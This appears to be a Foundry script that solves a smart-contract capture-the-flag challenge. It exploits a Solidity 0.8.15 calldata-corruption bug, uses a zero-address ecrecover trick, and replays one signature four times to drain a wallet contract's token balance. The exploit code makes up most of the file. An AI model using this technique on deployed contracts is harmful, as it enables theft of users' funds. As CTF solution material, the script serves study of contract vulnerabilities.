// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/wallet/NumenWallet.sol";

// https://github.com/ethereum/solidity/blob/develop/Changelog.md#0816-2022-08-08

// 0.8.15 bug where there was data corruption of the first values of nested calldata
// for structs. Meaning that the holder address will be set to 0 in the verify()
// function. So erecover will need to have a random positive v that is not 27 or 28
// to return 0 address.

// Also addresses aren't uniquely checked so we can just replay the same sig

contract WalletScript is Script {
    address contractAddress = vm.envAddress("CONTRACT_ADDRESS");
    uint256 playerKey = vm.envUint("PRIVATE_KEY");
    Wallet challenge;

    function setUp() public {
        challenge = new Wallet();
    }

    function run() public {
        // Private keys to remix IDE located here
        // https://github.com/ethereum/remix-project/blob/d13fea7e8429436de6622d855bf75688c664a956/libs/remix-simulator/src/methods/accounts.ts
        uint256 remixKey = 0x503f38a9c967ed597e47fe25643985f032b072db8075426a92110f82df48dfcb;
        address remixAddress = vm.addr(remixKey);
        address to = vm.addr(playerKey);
        uint256 amount = IERC20(challenge.token()).balanceOf(address(challenge));
        Holder memory holder = Holder(remixAddress, "manamejeff", true, "");
        Signature memory sig = Signature(69, [bytes32(0), bytes32(0)]);
        SignedByowner memory sowner = SignedByowner(holder, sig);
        SignedByowner[] memory sigs = new SignedByowner[](4);
        for (uint256 i = 0; i < 4; ++i) {
            sigs[i] = sowner;
        }
        vm.startBroadcast(playerKey);
        challenge.transferWithSign(to, amount, sigs);
        require(challenge.isSolved(), "challenge not solved");
    }
}
